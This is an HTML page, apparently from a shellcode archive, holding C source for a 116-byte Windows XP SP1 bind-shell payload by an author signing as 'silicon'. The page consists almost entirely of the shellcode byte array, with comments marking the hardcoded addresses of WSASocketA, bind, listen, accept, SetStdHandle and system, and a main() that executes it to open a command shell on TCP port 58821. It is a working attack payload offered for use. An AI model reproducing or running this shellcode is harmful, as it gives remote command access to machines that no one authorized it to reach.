<html><head><title>Windows - XP-sp1 portshell on port 58821 - 116 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 116 bytes bindcode hardcoded for Windows XP SP1 */
/* but you can change the address if you want */
/* i made it pretty clear where they are  */
/* the bindcode will bind to port 58821 */
/* by silicon / silicon@chello.no */
/* greetz to dtors.net :)

#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;

unsigned char bindcode[] = // 116 bytes bindcode for windows, port=58821, by silicon :)
&quot;\x83\xC4\xEC\x33\xC0\x50\x50\x50\x6A\x06&quot;
&quot;\x6A\x01\x6A\x02\xB8&quot;
&quot;\x01\x5A\xAB\x71&quot; // address of WSASocketA()
&quot;\xFF\xD0\x8B\xD8\x33\xC0\x89\x45\xF4\xB0&quot;
&quot;\x02\x66\x89\x45\xF0\x66\xC7\x45\xF2\xE5&quot;
&quot;\xC5\x6A\x10\x8D\x55\xF0\x52\x53\xB8&quot;
&quot;\xCE\x3E\xAB\x71&quot; // address of bind()
&quot;\xFF\xD0\x6A\x01\x53\xB8&quot;
&quot;\xE2\x5D\xAB\x71&quot; // address of listen()
&quot;\xFF\xD0\x33\xC0\x50\x50\x53\xB8&quot;
&quot;\x8D\x86\xAB\x71&quot; // address of accept()
&quot;\xFF\xD0\x8B\xD8\xBA&quot;
&quot;\x1D\x20\xE8\x77&quot; // address of SetStdHandle()
&quot;\x53\x6A\xF6\xFF\xD2\x53\x6A\xF5\xFF\xD2&quot;
&quot;\x53\x6A\xF4\xFF\xD2\xC7\x45\xFB\x41\x63&quot;
&quot;\x6D\x64\x8D\x45\xFC\x50\xB8&quot;
&quot;\x44\x80\xC2\x77&quot; // address of system()
&quot;\xFF\xD0&quot;;

int main(){
 WSADATA wsadata;
 WSAStartup(WINSOCK_VERSION,&amp;wsadata);
 ((void (*)(void)) &amp;bindcode)(); 
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
